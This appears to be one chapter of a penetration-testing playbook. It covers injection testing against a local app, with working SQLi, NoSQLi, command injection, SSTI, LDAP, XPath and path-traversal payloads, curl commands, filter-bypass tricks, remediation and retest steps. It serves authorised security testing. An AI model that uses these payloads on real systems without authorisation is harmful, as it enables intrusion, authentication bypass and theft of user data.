# 05 — Injection

## 1. Scope and preconditions

The app accepts input that reaches a query, a shell, a template, a directory service, or a parser. Test one parameter at a time, with a baseline request and a control payload. Stop at the Proof Cap: one row, one command, no data dump.

```bash
TARGET="http://127.0.0.1:5001"
OUT=".redteam/evidence/injection"
mkdir -p "$OUT"
```

## 2. Required Test Identities and seeded data

Anonymous for public inputs; user A for authenticated inputs. Seed one row owned by A and one by B so a successful injection can be tied to a known record. Never inject into a real user's data.

## 3. Enumeration

Map every input that reaches a data store: search, login, filters, sort, pagination, report parameters, headers, cookies, GraphQL arguments, file names. Send a single quote, a double quote, a backslash, and a benign value; compare status, body, timing, and length.

```bash
for q in "test" "test'" 'test"' 'test\\'; do
  curl -sS -o "$OUT/body" -w '%{http_code} %{time_total} %{size_download}\n' \
    --get --data-urlencode "q=$q" "$TARGET/search"
  if command -v sha256sum >/dev/null 2>&1; then sha256sum "$OUT/body"; else shasum -a 256 "$OUT/body"; fi
done
```

## 4. Test cases

| # | Test | Exact request / command | Signal |
|---|---|---|---|
| 1 | SQLi error | `curl -sS --get --data-urlencode "q=test'" "$TARGET/search"` | SQL error, 500, or stack trace |
| 2 | SQLi boolean | `q=test' OR '1'='1` vs `q=test' AND '1'='2` | Different result sets |
| 3 | SQLi time | `q=test' OR SLEEP(3)--` (MySQL) or `q=test'; SELECT pg_sleep(3)--` (Postgres) | Repeatable delay |
| 4 | SQLi union | `q=test' UNION SELECT 1,2,3--` | Injected columns in the response |
| 5 | NoSQLi | `-d '{"username":{"$ne":null},"password":{"$ne":null}}'` | Login or filter bypass |
| 6 | Command injection | `q=test; id`, `q=test|id`, `q=test$(id)` | Command output or timing |
| 7 | SSTI | `q={{7*7}}`, `q=${7*7}`, `q=<%= 7*7 %>` | `49` rendered |
| 8 | LDAP injection | `q=*)(uid=*))(|(uid=*` | Expanded result set |
| 9 | XPath injection | `q=' or '1'='1` in an XML-backed search | All nodes returned |
| 10 | Header injection | `-H "X-Forwarded-For: ' OR 1=1--"` | Query effect via a trusted header |
| 11 | ORM injection | `?filter[where][id]=1 OR 1=1` or `?where={"id":{"$ne":null}}` | Filter bypass |
| 12 | Template path | `?template=../../etc/passwd` or `?view=index` | File read or template control |

### Confirming SQLi without dumping data

```bash
# Boolean pair: the true condition returns more rows than the false condition.
curl -sS --get --data-urlencode "q=widget' OR '1'='1" "$TARGET/search" > "$OUT/sqli_true.html"
curl -sS --get --data-urlencode "q=widget' AND '1'='2" "$TARGET/search" > "$OUT/sqli_false.html"
wc -c "$OUT/sqli_true.html" "$OUT/sqli_false.html"

# Time pair: run each three times and compare medians.
for i in 1 2 3; do
  curl -sS -o /dev/null -w '%{time_total}\n' --get --data-urlencode "q=widget' OR SLEEP(3)--" "$TARGET/search"
done
for i in 1 2 3; do
  curl -sS -o /dev/null -w '%{time_total}\n' --get --data-urlencode "q=widget" "$TARGET/search"
done
```

Prove one row with a bounded union, then stop:

```bash
curl -sS --get --data-urlencode "q=widget' UNION SELECT id,email,role FROM users LIMIT 1--" "$TARGET/search"
```

Do not enumerate further. One row is the Proof Cap.

## 5. Bypass variants

- Quote and encoding: `%27`, `%2527`, Unicode apostrophes, null bytes.
- Comment styles: `-- `, `#`, `/* */`, `;%00`.
- Case and whitespace: `SeLeCt`, tabs, newlines, inline comments.
- Keyword filters: `UNION` split with comments, `SEL/**/ECT`, alternate encodings.
- Parameter pollution: duplicate parameters, JSON duplicate keys, array injection.
- Second-order: store the payload in a profile, then trigger it in an admin report.
- Template engines: different delimiters (`{{}}`, `${}`, `<%%>`, `#{}`).
- Command separators: `;`, `|`, `||`, `&&`, `\n`, backticks, `$()`.

## 6. Evidence to capture

- Baseline and payload response, with status, length, hash, and timing.
- The injected parameter and the exact encoded payload.
- For SQLi: the one-row proof and the column count.
- For command injection: the `id` or `hostname` output.
- For SSTI: the evaluated result and the engine fingerprint.
- For blind cases: a local callback listener log with timestamps.

## 7. False-positive traps

- A 500 on a quote may be input validation, not SQLi. Confirm with a boolean or time pair.
- A delay may be network jitter. Repeat three times and compare a control payload.
- Reflected input in an error page is not injection unless it changes the query behavior.
- A WAF may block one payload and allow an encoded variant; do not conclude "safe" from a block.
- `{{7*7}}` rendering `49` in a static page may be client-side templating, not server-side.

## 8. Severity guidance

| Finding | Typical severity | CWE / WSTG |
|---|---|---|
| SQLi with data read | High to Critical | CWE-89, WSTG-INPV-05 |
| SQLi auth bypass | Critical | CWE-89, WSTG-INPV-05 |
| Command injection | Critical | CWE-78, WSTG-INPV-12 |
| SSTI to RCE | Critical | CWE-1336, WSTG-INPV-18 |
| NoSQLi auth bypass | High to Critical | CWE-943, WSTG-INPV-05 |
| LDAP/XPath injection | High | CWE-90, CWE-643 |
| Header injection | Medium | CWE-113, WSTG-INPV-17 |
| ORM filter bypass | Medium to High | CWE-943 |

## 9. Remediation patterns

- Parameterize queries; never concatenate input into SQL, NoSQL, LDAP, or XPath.
- Use an ORM correctly; do not pass raw filter objects from the client.
- Avoid shell execution; if unavoidable, use an allowlist and argument arrays, never a shell string.
- Use logic-less templates or auto-escaping; never render user input as a template.
- Validate type, length, and format at the boundary; reject unexpected structures.
- Apply least privilege to the database and the process.

## 10. Retest procedure

Replay the exact payload. Expect a normal page, no error, no delay difference, and no injected row. Replay the encoded and second-order variants. Confirm the control payload still behaves normally. For command injection, confirm `id` is not executed and the input is rejected or escaped.

## Resources

- OWASP WSTG: WSTG-INPV-05, WSTG-INPV-12, WSTG-INPV-18.
- OWASP Cheat Sheet: SQL Injection Prevention, OS Command Injection Defense, Injection Prevention.
- CWE-78, CWE-89, CWE-90, CWE-643, CWE-943, CWE-1336.
- PortSwigger Academy: SQLi, NoSQLi, command injection, SSTI labs.
